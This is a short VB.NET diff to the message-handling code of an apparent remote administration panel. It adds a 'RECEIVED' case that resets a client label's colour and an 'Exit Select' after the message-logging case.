@@ -24,6 +24,12 @@
                     End If
                     Exit Select
 
+                Case "RECEIVED"
+                    If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
+                        C.L.ForeColor = Nothing
+                    End If
+                    Exit Select
+
                 Case "RD-"
                     If F.InvokeRequired Then : F.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                         Dim RD As RemoteDesktop = My.Application.OpenForms("RD" + C.IP)
@@ -61,6 +67,8 @@
 
                 Case "Msg"
                     ClinetLog(C, A(1), Color.Black)
+                    Exit Select
+
             End Select
             Exit Sub
         Catch ex As Exception
